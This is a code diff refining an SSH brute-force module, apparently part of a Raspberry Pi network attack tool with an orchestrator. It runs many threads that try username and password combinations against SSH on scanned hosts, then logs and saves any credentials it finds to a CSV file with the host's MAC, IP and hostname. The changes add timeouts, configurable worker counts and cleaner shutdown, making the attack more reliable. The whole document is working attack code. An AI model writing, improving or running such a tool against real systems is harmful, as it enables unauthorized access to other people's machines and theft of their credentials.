@@ -8,12 +8,17 @@ import paramiko
 import socket
 import threading
 import logging
-from queue import Queue
+import time
+from queue import Queue, Empty
 from shared import SharedData
 from logger import Logger
+from timeout_utils import (
+    join_threads_with_timeout,
+    drain_queue_safely
+)
 
 # Configure the logger
-logger = Logger(name="ssh_connector.py", level=logging.DEBUG)
+logger = Logger(name="ssh_connector.py", level=logging.INFO)
 
 # Define the necessary global variables
 b_class = "SSHBruteforce"
@@ -31,21 +36,34 @@ class SSHBruteforce:
         self.ssh_connector = SSHConnector(shared_data)
         logger.info("SSHConnector initialized.")
 
-    def bruteforce_ssh(self, ip, port):
+    def bruteforce_ssh(self, ip, port, mac_address='', hostname=''):
         """
         Run the SSH brute force attack on the given IP and port.
         """
         logger.info(f"Running bruteforce_ssh on {ip}:{port}...")
-        return self.ssh_connector.run_bruteforce(ip, port)
+        return self.ssh_connector.run_bruteforce(ip, port, mac_address, hostname)
 
     def execute(self, ip, port, row, status_key):
         """
         Execute the brute force attack and update status.
         """
+        start_time = time.time()
+        logger.lifecycle_start("SSHBruteforce", ip, port)
         logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
         self.shared_data.bjornorch_status = "SSHBruteforce"
-        success, results = self.bruteforce_ssh(ip, port)
-        return 'success' if success else 'failed'
+        # Extract hostname and MAC from the row passed by orchestrator
+        hostname = row.get('Hostnames', '')
+        mac_address = row.get('MAC Address', '')
+        try:
+            success, results = self.bruteforce_ssh(ip, port, mac_address, hostname)
+            status = 'success' if success else 'no_creds_found'
+        except Exception as e:
+            logger.error(f"SSH bruteforce error for {ip}: {e}")
+            status = 'error'
+        finally:
+            duration = time.time() - start_time
+            logger.lifecycle_end("SSHBruteforce", status, duration, ip)
+        return status
 
 class SSHConnector:
     """
@@ -61,7 +79,7 @@ class SSHConnector:
         self.lock = threading.Lock()
         self.sshfile = shared_data.sshfile
         if not os.path.exists(self.sshfile):
-            logger.info(f"File {self.sshfile} does not exist. Creating...")
+            logger.debug(f"Creating {self.sshfile}")
             with open(self.sshfile, "w") as f:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         self.results = []  # List to store results temporarily
@@ -91,12 +109,14 @@ class SSHConnector:
     def ssh_connect(self, adresse_ip, user, password):
         """
         Attempt to connect to an SSH service using the given credentials.
+        Reduced banner_timeout from 200s to 30s for faster failure detection.
         """
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
         try:
-            ssh.connect(adresse_ip, username=user, password=password, banner_timeout=200)  # Adjust timeout as necessary
+            ssh.connect(adresse_ip, username=user, password=password,
+                       banner_timeout=30, timeout=30, auth_timeout=30)
             return True
         except (paramiko.AuthenticationException, socket.error, paramiko.SSHException):
             return False
@@ -106,38 +126,49 @@ class SSHConnector:
     def worker(self, success_flag):
         """
         Worker thread to process items in the queue.
+        Uses graceful shutdown pattern with timeout on queue.get().
         """
-        while not self.queue.empty():
+        while True:
             if self.shared_data.orchestrator_should_exit:
                 logger.info("Orchestrator exit signal received, stopping worker thread.")
                 break
+            try:
+                item = self.queue.get(timeout=1.0)
+            except Empty:
+                if self.queue.empty():
+                    break
+                continue
 
-            adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
-            if self.ssh_connect(adresse_ip, user, password):
-                with self.lock:
-                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
-                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+            adresse_ip, user, password, mac_address, hostname, port = item
+            try:
+                if self.ssh_connect(adresse_ip, user, password):
+                    with self.lock:
+                        self.results.append([mac_address, adresse_ip, hostname, user, password, port])
+                        logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+                        success_flag[0] = True
+                    # File I/O outside lock
                     self.save_results()
                     self.removeduplicates()
-                    success_flag[0] = True
-            self.queue.task_done()
-            with self.progress_lock:
-                self.progress_count += 1
-                if self.progress_count % 50 == 0:
-                    logger.info(f"Bruteforcing SSH... {self.progress_count}/{self.progress_total}")
+            finally:
+                self.queue.task_done()
+                with self.progress_lock:
+                    self.progress_count += 1
+                    if self.progress_count % 50 == 0:
+                        logger.info(f"Bruteforcing SSH... {self.progress_count}/{self.progress_total}")
 
 
-    def run_bruteforce(self, adresse_ip, port):
-        self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
-
-        # Find the row for this IP
-        mac_address = ""
-        hostname = ""
-        for row in self.scan:
-            if row.get('IPs') == adresse_ip:
-                mac_address = row.get('MAC Address', '')
-                hostname = row.get('Hostnames', '')
-                break
+    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
+        # Use provided mac_address and hostname from orchestrator (more reliable)
+        # Fallback to lookup if not provided
+        if not mac_address or not hostname:
+            self.load_scan_file()
+            for row in self.scan:
+                if row.get('IPs') == adresse_ip:
+                    if not mac_address:
+                        mac_address = row.get('MAC Address', '')
+                    if not hostname:
+                        hostname = row.get('Hostnames', '')
+                    break
 
         total_tasks = len(self.users) * len(self.passwords)
         self.progress_total = total_tasks
@@ -155,23 +186,32 @@ class SSHConnector:
 
         logger.info(f"Bruteforcing SSH on {adresse_ip}... (0/{total_tasks})")
 
-        for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
+        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
             t = threading.Thread(target=self.worker, args=(success_flag,))
             t.start()
             threads.append(t)
 
+        # Wait for queue with exit signal checking
+        queue_timeout = 300  # 5 minute max for queue processing
+        queue_start = time.time()
         while not self.queue.empty():
             if self.shared_data.orchestrator_should_exit:
                 logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    self.queue.get()
-                    self.queue.task_done()
+                drain_queue_safely(self.queue)
                 break
+            if time.time() - queue_start > queue_timeout:
+                logger.lifecycle_timeout("SSHBruteforce", "queue processing", queue_timeout, adresse_ip)
+                drain_queue_safely(self.queue)
+                break
+            time.sleep(0.5)
 
-        self.queue.join()
+        # Give workers time to finish current items
+        time.sleep(2)
 
-        for t in threads:
-            t.join()
+        # Join threads with timeout
+        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
+        if hanging:
+            logger.warning(f"SSH bruteforce: {len(hanging)} threads did not terminate cleanly")
 
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
@@ -180,6 +220,10 @@ class SSHConnector:
         """
         Save the results of successful connection attempts to a CSV file.
         """
+        # Ensure file exists with header
+        if not os.path.exists(self.sshfile):
+            with open(self.sshfile, 'w', newline='') as f:
+                f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
         with open(self.sshfile, 'a', newline='') as f:
             writer = csv.writer(f)
             for row in self.results:
